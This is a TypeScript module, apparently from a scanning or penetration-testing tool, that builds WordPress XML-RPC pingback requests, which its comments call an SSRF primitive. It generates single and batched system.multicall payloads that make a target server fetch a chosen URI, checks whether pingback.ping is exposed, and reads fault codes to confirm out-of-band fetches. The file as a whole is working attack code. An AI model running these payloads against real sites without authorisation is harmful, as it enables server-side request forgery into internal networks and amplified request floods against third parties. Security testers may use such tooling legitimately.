/**
 * WordPress XML-RPC pingback payloads.
 *
 * WordPress exposes `/xmlrpc.php`; `pingback.ping(sourceUri, targetUri)` makes
 * the server fetch `sourceUri` (our SSRF primitive). Unlike a query-parameter
 * payload this is a POST with `text/xml` to a fixed endpoint, and the HTTP
 * status stays 200 even on failure — the signal is the XML-RPC faultCode:
 * fault 17 means the server *tried* the fetch, so check OOB anyway.
 *
 * @see https://codex.wordpress.org/XML-RPC_WordPress_API/Pingbacks
 */
export const XMLRPC_PATH = "/xmlrpc.php";
export const XMLRPC_CONTENT_TYPE = "text/xml";
export const PINGBACK_METHOD = "pingback.ping";
export const LIST_METHODS_METHOD = "system.listMethods";
/** Upper bound for one system.multicall body (keeps the XML request sane). */
export const MAX_MULTICALL = 50;

export interface PingbackRequest {
  url: string;
  method: "POST";
  headers: Record<string, string>;
  body: string;
}

export interface PingbackVerdict {
  faultCode: number | null;
  /** True when the target server attempted (or completed) the source fetch. */
  fetched: boolean;
  reason: string;
}

function escapeXml(value: string): string {
  return String(value)
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;")
    .replace(/'/g, "&apos;");
}

function decodeXml(value: string): string {
  return value
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&apos;/g, "'")
    .replace(/&#(\d+);/g, (_m, n) => String.fromCodePoint(Number(n)))
    .replace(/&amp;/g, "&");
}

/** POST destination for a target URL: `<origin>/xmlrpc.php`. */
export function xmlrpcEndpoint(targetUrl: string): string {
  return new URL(XMLRPC_PATH, targetUrl).toString();
}

function methodCall(methodName: string, paramsXml: string): string {
  return `<?xml version="1.0"?>\n<methodCall>\n<methodName>${methodName}</methodName>\n<params>${paramsXml}</params>\n</methodCall>\n`;
}

function pingbackParams(sourceUri: string, targetUri: string): string {
  return `<param><value><string>${escapeXml(sourceUri)}</string></value></param>` +
    `<param><value><string>${escapeXml(targetUri)}</string></value></param>`;
}

export interface PingbackArgs {
  sourceUri: string;
  targetUri: string;
  /** Number of batched pingback.ping calls (default 1, clamped to MAX_MULTICALL). */
  count?: number;
}

/** Non-multicall form: a single `pingback.ping` methodCall. */
export function buildPingbackSingle({ sourceUri, targetUri }: PingbackArgs): string {
  return methodCall(PINGBACK_METHOD, pingbackParams(sourceUri, targetUri));
}

/** `system.multicall` form batching N identical pingback.ping entries. */
export function buildPingbackMulticall({ sourceUri, targetUri, count }: PingbackArgs): string {
  const raw = Math.trunc(Number(count ?? 1));
  const n = Number.isFinite(raw) ? Math.max(1, Math.min(MAX_MULTICALL, raw)) : 1;
  const entries = Array.from({ length: n }, () =>
    `<value><struct>` +
    `<member><name>methodName</name><value><string>${PINGBACK_METHOD}</string></value></member>` +
    `<member><name>params</name><value><array><data>` +
    `<value><string>${escapeXml(sourceUri)}</string></value>` +
    `<value><string>${escapeXml(targetUri)}</string></value>` +
    `</data></array></value></member>` +
    `</struct></value>`
  ).join("");
  const params = `<param><value><array><data>${entries}</data></array></value></param>`;
  return methodCall("system.multicall", params);
}

/** `system.listMethods` — used to check whether pingback.ping is available. */
export function buildListMethods(): string {
  return methodCall(LIST_METHODS_METHOD, "");
}

/** Extract `<string>` method names from a system.listMethods response. */
export function parseMethodList(body: string): string[] {
  const out: string[] = [];
  for (const match of String(body ?? "").matchAll(/<string>\s*([^<]*?)\s*<\/string>/g)) {
    const name = decodeXml(match[1]).trim();
    if (name) out.push(name);
  }
  return out;
}

/** True when a listMethods response advertises pingback.ping. */
export function hasPingbackMethod(body: string): boolean {
  return parseMethodList(body).includes(PINGBACK_METHOD);
}

/**
 * Fault-code interpretation table. HTTP status is misleading here: fault 17
 * returns a fault yet the server already fetched our source URI.
 */
export const PINGBACK_FAULT_TABLE: Record<string, { fetched: boolean; reason: string }> = {
  "17": {
    fetched: true,
    reason: "source URI does not exist — server attempted the fetch; check OOB",
  },
  "33": {
    fetched: false,
    reason: "target is not a valid pingback target — supply a real post URL on the site",
  },
  "-32700": { fetched: false, reason: "parse error — malformed XML request" },
  "-32600": { fetched: false, reason: "invalid request — dispatch failed" },
  "-32601": { fetched: false, reason: "method not found — pingback.ping unavailable" },
};

/**
 * Interpret a pingback.ping XML-RPC response body.
 *
 * `fetched` is true for fault 17 and for the success struct (message like
 * "Pingback from ... to ... registered..."), false for fault 33 and the
 * XML-RPC dispatch faults. Unknown/malformed bodies never throw.
 */
export function interpretPingbackResponse(body: string): PingbackVerdict {
  const text = String(body ?? "");
  if (/<fault>/i.test(text)) {
    const match = text.match(/<int>\s*(-?\d+)\s*<\/int>/);
    if (!match) {
      return { faultCode: null, fetched: false, reason: "fault response without a readable faultCode" };
    }
    const code = Number(match[1]);
    const entry = PINGBACK_FAULT_TABLE[String(code)];
    return {
      faultCode: code,
      fetched: entry?.fetched ?? false,
      reason: entry?.reason ?? `unknown faultCode ${code}`,
    };
  }
  if (/registered|pingback from/i.test(text)) {
    return {
      faultCode: null,
      fetched: true,
      reason: "pingback registered — server fetched the source URI",
    };
  }
  return { faultCode: null, fetched: false, reason: "unrecognized response body" };
}

/** Full POST request for the pingback payload (single unless count > 1). */
export function buildPingbackRequest(options: {
  targetUrl: string;
  sourceUri: string;
  targetUri: string;
  count?: number;
}): PingbackRequest {
  const { targetUrl, sourceUri, targetUri, count } = options;
  const body = count !== undefined && count > 1
    ? buildPingbackMulticall({ sourceUri, targetUri, count })
    : buildPingbackSingle({ sourceUri, targetUri });
  return {
    url: xmlrpcEndpoint(targetUrl),
    method: "POST",
    headers: { "Content-Type": XMLRPC_CONTENT_TYPE },
    body,
  };
}
